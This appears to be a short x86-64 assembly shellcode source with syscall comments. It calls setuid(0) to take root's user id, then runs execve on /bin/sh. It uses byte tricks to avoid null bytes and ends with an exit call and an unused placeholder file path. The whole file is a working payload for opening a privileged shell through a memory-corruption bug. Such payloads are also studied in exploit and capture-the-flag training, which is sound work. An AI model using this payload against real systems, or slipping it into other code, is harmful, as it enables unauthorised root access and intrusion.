.global _start 
_start:
.intel_syntax noprefix

        # setuid(uid_t uid);
	# rax	System Call	 rdi
	# 105	sys_setuid	 uid_t uid

        push 105
        pop rax
        xor rdi, rdi
        syscall


	# execve(const char *pathname, char *const argv[], char *const envp[]);
        # rax	System Call	   rdi	                 rsi	             rdx
        # 59	sys_execve	   const char* filename	 const char* argv[]	 const char* envp[]
        
        push 59
        pop rax
        xor rsi, rsi
        xor rdx, rdx 
        mov rdi, 0x68732f6e69622f6a # j/bin/sh (reversed for endianess)
        shr rdi, 8 # shift out j for null byte
        push rdi
        push rsp 
        pop rdi
        syscall


        # exit(int status);
        # rax	System Call	 rdi
        # 60	sys_exit	 int error_code
        
        push 60
        pop rax
        xor rdi, rdi
        syscall

filetext:
        .string "/path/to/file"
